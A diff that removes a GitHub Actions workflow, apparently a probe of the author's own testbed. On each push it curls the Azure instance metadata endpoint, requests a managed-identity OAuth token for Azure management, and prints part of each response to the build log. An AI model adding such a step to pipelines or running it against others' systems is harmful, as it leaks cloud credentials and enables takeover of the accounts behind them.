@@ -1,7 +1,0 @@
-name: imds-test-own-testbed
-on: push
-jobs:
-  t:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "===AZURE-META==="; curl -m 5 -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 500; echo; echo "===IDENTITY-TOKEN==="; curl -m 5 -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 500; echo; echo DONE
